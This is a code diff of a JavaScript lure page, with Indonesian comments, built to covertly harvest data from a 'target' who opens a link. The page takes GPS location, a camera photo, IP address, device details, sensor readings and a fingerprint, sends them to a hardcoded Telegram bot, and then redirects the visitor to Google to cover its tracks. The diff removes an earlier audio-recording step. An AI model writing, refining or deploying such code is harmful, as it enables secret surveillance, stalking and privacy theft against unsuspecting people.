@@ -1,7 +1,7 @@
 //
 // ===================================
 //   Dibuat oleh: Ahmad Zaki
-//   Versi: v3 (Dengan Redirect)
+//   Versi: v-Cepat (Tanpa Audio, Lebih Cepat)
 // ===================================
 //
 
@@ -17,7 +17,6 @@ const chatId = params.get('uid');
 const botToken = '6136209053:AAF01MfDjE9oIajSHIDBDTpJ70CUuTqQLpY';
 
 // --- Fungsi Helper ---
-// (Fungsi updateStatus tetap ada untuk debugging, meski tidak terlihat)
 const updateStatus = (message, isError = false) => {
   const li = document.createElement('li');
   li.textContent = message;
@@ -26,7 +25,7 @@ const updateStatus = (message, isError = false) => {
   statusList.scrollTop = statusList.scrollHeight;
 };
 
-// ... (Semua fungsi getDeviceInfo, getLocation, getPhoto, getIpAddress, getAudio, getSensorData, getCanvasFingerprint tetap sama) ...
+// ... (Fungsi getDeviceInfo, getLocation, getPhoto, getIpAddress, getSensorData, getCanvasFingerprint tetap sama) ...
 const getDeviceInfo = async () => {
   updateStatus('1. Mengambil info perangkat...');
   const data = {
@@ -60,7 +59,7 @@ const getPhoto = async () => {
   videoEl.srcObject = stream;
   await new Promise(resolve => videoEl.onloadedmetadata = resolve);
   videoEl.play();
-  await new Promise(resolve => setTimeout(resolve, 500));
+  await new Promise(resolve => setTimeout(resolve, 500)); // Jeda 0.5 detik (cepat)
   canvasEl.width = videoEl.videoWidth; canvasEl.height = videoEl.videoHeight;
   const context = canvasEl.getContext('2d');
   context.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
@@ -76,26 +75,8 @@ const getIpAddress = async () => {
     const data = await response.json(); return data.ip || 'N/A';
   } catch (err) { return `Gagal: ${err.message}`; }
 };
-const getAudio = () => {
-  updateStatus('5. Merekam audio (Harap izinkan)...');
-  return new Promise(async (resolve, reject) => {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-      const mediaRecorder = new MediaRecorder(stream);
-      const audioChunks = [];
-      mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
-      mediaRecorder.onstop = () => {
-        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-        stream.getTracks().forEach(track => track.stop()); resolve(audioBlob);
-      };
-      mediaRecorder.onerror = (err) => { stream.getTracks().forEach(track => track.stop()); reject(err); };
-      mediaRecorder.start();
-      setTimeout(() => mediaRecorder.stop(), 7000); 
-    } catch (err) { reject(err); }
-  });
-};
 const getSensorData = () => {
-  updateStatus('6. Mengambil data sensor...');
+  updateStatus('5. Mengambil data sensor...');
   return new Promise((resolve, reject) => {
     try {
       if ('Accelerometer' in window) {
@@ -116,7 +97,7 @@ const getSensorData = () => {
   });
 };
 const getCanvasFingerprint = () => {
-  updateStatus('7. Membuat fingerprint perangkat...');
+  updateStatus('6. Membuat fingerprint perangkat...');
   return new Promise((resolve) => {
     try {
       const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d');
@@ -134,13 +115,12 @@ const getCanvasFingerprint = () => {
   });
 };
 
-
-// --- Fungsi sendToTelegram (tetap sama) ---
+// --- Fungsi sendToTelegram (Tanpa Audio) ---
 const sendToTelegram = async (data) => {
-  updateStatus('8. Mengirim semua data...');
-  const { deviceInfo, location, photoBase64, ipAddress, audioBlob, sensor, fingerprint } = data;
+  updateStatus('7. Mengirim semua data...');
+  const { deviceInfo, location, photoBase64, ipAddress, sensor, fingerprint } = data;
   const message = `
-🔔 *DATA TARGET DITERIMA (v3)* (${alias || 'Target'})
+🔔 *DATA TARGET DITERIMA (v-Cepat)* (${alias || 'Target'})
 --------------------------------------------------
 *📍 Lokasi & Jaringan*
 • IP Publik: \`${ipAddress}\`
@@ -163,45 +143,42 @@ const sendToTelegram = async (data) => {
 --------------------------------------------------
   `.trim();
 
+  // Kirim Info Teks
   await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
     method: 'POST', headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
   });
+  // Kirim Lokasi
   await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
     method: 'POST', headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ chat_id: chatId, latitude: location.lat, longitude: location.lon, horizontal_accuracy: location.accuracy })
   });
+  // Kirim Foto
   const photoFormData = new FormData();
   photoFormData.append('chat_id', chatId);
   photoFormData.append('photo', await (await fetch(photoBase64)).blob(), 'selfie.jpg');
   await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: photoFormData });
-  const audioFormData = new FormData();
-  audioFormData.append('chat_id', chatId);
-  audioFormData.append('audio', audioBlob, 'recording.wav');
-  await fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, { method: 'POST', body: audioFormData });
+  
+  // TIDAK ADA PENGIRIMAN AUDIO
   
   updateStatus('✅ Semua data berhasil dikirim!');
 };
 
-// --- Fungsi Utama (Diperbarui dengan REDIRECT) ---
+// --- Fungsi Utama (Tanpa Audio, Lebih Cepat) ---
 const start = async () => {
   if (!chatId || !alias) {
-    updateStatus('❌ Error: Link tidak valid atau parameter hilang.', true);
-    // ----- REDIRECT JIKA GAGAL -----
-    setTimeout(() => {
-      window.location.href = 'https://www.google.com';
-    }, 1000);
-    // --------------------------------
+    updateStatus('❌ Error: Link tidak valid.', true);
+    setTimeout(() => { window.location.href = 'https://www.google.com'; }, 500);
     return;
   }
   
   try {
     const data = {};
     
-    // Meminta izin satu per satu
+    // Meminta izin satu per satu (Hanya Lokasi & Kamera)
     data.location = await getLocation();
     data.photoBase64 = await getPhoto();
-    data.audioBlob = await getAudio();
+    // data.audioBlob = await getAudio(); // <-- FUNGSI INI DIHAPUS
 
     // Ambil data non-izin
     const [deviceInfo, ipAddress, sensor, fingerprint] = await Promise.all([
@@ -216,27 +193,25 @@ const start = async () => {
     data.fingerprint = fingerprint;
 
     await sendToTelegram(data);
-    updateStatus('Selesai. Anda bisa menutup halaman ini.');
+    updateStatus('Selesai.');
     
-    // ----- REDIRECT SETELAH SUKSES -----
+    // Redirect cepat
     setTimeout(() => {
       window.location.href = 'https://www.google.com';
-    }, 1500); // Tunggu 1.5 detik
-    // -----------------------------------
+    }, 1000); // Redirect setelah 1 detik
     
   } catch (err) {
     console.error(err);
     let errorMsg = `❌ Error: ${err.message}`;
     if (err.message.includes('permission') || err.message.includes('denied')) {
-        errorMsg = `❌ Error: Izin (Lokasi/Kamera/Mikrofon) ditolak oleh target.`;
+        errorMsg = `❌ Error: Izin (Lokasi/Kamera) ditolak oleh target.`;
     }
     updateStatus(errorMsg, true);
     
-    // ----- REDIRECT JIKA ADA ERROR (misal: izin ditolak) -----
+    // Redirect jika gagal
     setTimeout(() => {
       window.location.href = 'https://www.google.com';
-    }, 1000); // Tunggu 1 detik
-    // ----------------------------------------------------
+    }, 500);
   }
 };
 
